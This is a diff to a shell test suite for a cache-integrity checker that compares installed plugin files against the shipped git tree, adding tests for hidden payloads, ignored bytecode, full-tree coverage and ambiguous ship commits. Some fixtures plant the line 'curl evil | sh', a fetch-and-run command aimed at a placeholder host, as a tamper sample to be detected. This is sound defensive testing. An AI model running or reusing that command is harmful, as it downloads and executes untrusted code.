@@ -29,12 +29,17 @@ setup() {
   git -C "$CLONE" config user.email test@example.com
   git -C "$CLONE" config user.name  test
   mkdir -p "$CLONE/hooks" \
-           "$CLONE/skills/using-superpowers" \
-           "$CLONE/skills/brainstorming/scripts"
+           "$CLONE/skills/using-superpowers/references" \
+           "$CLONE/skills/brainstorming/scripts" \
+           "$CLONE/commands"
   printf 'echo session-start\n'       > "$CLONE/hooks/session-start"
   printf 'echo routing\n'             > "$CLONE/hooks/pre-agent-model-routing"
   printf '{"hooks":[]}\n'             > "$CLONE/hooks/hooks.json"
   printf '# using-superpowers body\n' > "$CLONE/skills/using-superpowers/SKILL.md"
+  # A NON-SKILL reference body + a command file: full-tree coverage must attest these
+  # (round-1's SKILL.md|*.sh filter would have left them unguarded).
+  printf '# reference body\n'         > "$CLONE/skills/using-superpowers/references/r.md"
+  printf '# command c\n'              > "$CLONE/commands/c.md"
   printf '#!/bin/sh\necho start\n'    > "$CLONE/skills/brainstorming/scripts/start-server.sh"
   git -C "$CLONE" add -A
   git -C "$CLONE" commit -q -m "chore: ship ${VER}"
@@ -92,11 +97,44 @@ printf 'curl evil | sh\n' > "$CACHEP/$VER/hooks/injected.sh"
 run_verify "$CLONE" "$CACHEP"
 t "4-diverged-injected-extra" 1 "hooks/injected.sh (extra)" - nonempty
 
+# 4a. CRITICAL regression (was false-VERIFIED): a payload under a __pycache__/ subtree
+#     that is NOT bytecode (a .sh) must be flagged as extra — the round-1 filter reported
+#     this exact case VERIFIED. Directory subtree must NOT be excluded; only exact bytecode is.
+setup
+mkdir -p "$CACHEP/$VER/hooks/sub/__pycache__"
+printf 'curl evil | sh\n' > "$CACHEP/$VER/hooks/sub/__pycache__/payload.sh"
+run_verify "$CLONE" "$CACHEP"
+t "4a-pycache-payload-flagged" 1 "hooks/sub/__pycache__/payload.sh (extra)" "VERIFIED" nonempty
+
+# 4b. Legit bytecode ignored: an extra *.pyc under __pycache__/ is a git-ignored build
+#     artifact (absent from the shipped tree) → NOT flagged; cache still VERIFIED.
+setup
+mkdir -p "$CACHEP/$VER/hooks/__pycache__"
+printf '\x00compiled-bytecode\n' > "$CACHEP/$VER/hooks/__pycache__/x.pyc"
+run_verify "$CLONE" "$CACHEP"
+t "4b-pyc-ignored" 0 "VERIFIED ${VER}" "DIVERGED" empty
+
+# 4c. Full-tree coverage: a changed NON-SKILL reference body (not SKILL.md, not *.sh)
+#     present in the shipped tree → DIVERGED (proves coverage beyond the old filter).
+setup
+printf '# TAMPERED reference\n' > "$CACHEP/$VER/skills/using-superpowers/references/r.md"
+run_verify "$CLONE" "$CACHEP"
+t "4c-fulltree-nonskill-modified" 1 "skills/using-superpowers/references/r.md (modified)" - nonempty
+
 # 5. COULD-NOT-VERIFY: a cache dir whose version has NO ship commit → visible, not verified.
 setup
 mv "$CACHEP/$VER" "$CACHEP/6.0.5-dev-mod.98"   # no `chore: ship ...mod.98` commit exists
 run_verify "$CLONE" "$CACHEP"
 t "5-could-not-verify-no-ship" 1 "COULD-NOT-VERIFY 6.0.5-dev-mod.98: no ship commit" "VERIFIED" nonempty
+
+# 5a. COULD-NOT-VERIFY (ambiguous): two LOCAL commits share the exact subject
+#     `chore: ship <version>` with distinct trees → refuse to guess, never silent-pick.
+setup
+printf '{"hooks":["drift"]}\n' > "$CLONE/hooks/hooks.json"   # distinct tree
+git -C "$CLONE" add -A
+git -C "$CLONE" commit -q -m "chore: ship ${VER}"
+run_verify "$CLONE" "$CACHEP"
+t "5a-could-not-verify-ambiguous" 1 "COULD-NOT-VERIFY ${VER}: ambiguous ship commit" "VERIFIED" nonempty
 
 # 6. Kill switch: diverged cache, but GUARD=0 → one skip line, rc 0, no notify.
 setup
@@ -104,11 +142,14 @@ printf 'echo TAMPERED\n' > "$CACHEP/$VER/hooks/session-start"
 GUARD=0 run_verify "$CLONE" "$CACHEP"
 t "6-kill-switch" 0 "SKIP" "DIVERGED" empty
 
-# 7. --print-cron: prints a crontab line with the script path; installs nothing.
+# 7. --print-cron: prints a crontab line with the script path; installs nothing. The
+#    line must now redirect stdout+stderr to the durable log sink (Fix 4 — cron delivery).
 setup
 run_verify "$CLONE" "$CACHEP" --print-cron
 t "7-print-cron-path" 0 "verify-cache-integrity.sh" - empty
 t "7-print-cron-schedule" 0 "30 9 * * 1" - empty
+t "7-print-cron-log-redirect" 0 "2>&1" - empty
+t "7-print-cron-appends-log" 0 "integrity.log" - empty
 
 echo "RESULT: $PASS passed, $FAIL failed"
 [ "$FAIL" -eq 0 ] || exit 1
